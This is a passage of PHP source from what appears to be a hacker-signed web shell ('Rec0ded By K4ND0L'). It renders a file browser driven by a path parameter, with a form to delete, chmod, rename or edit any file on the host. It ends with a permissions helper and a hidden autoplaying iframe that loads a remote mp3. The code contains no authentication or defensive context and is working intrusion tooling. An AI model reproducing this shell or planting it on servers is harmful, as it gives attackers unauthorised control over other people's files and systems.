}else{
$size = $size.' KB';
}
 
echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/>Rec0ded By K4ND0L </center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);
 
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
 
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
 
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
 
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
 
return $info;
}
?>
<iframe width="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://k.top4top.net/m_122534tot0.mp3">

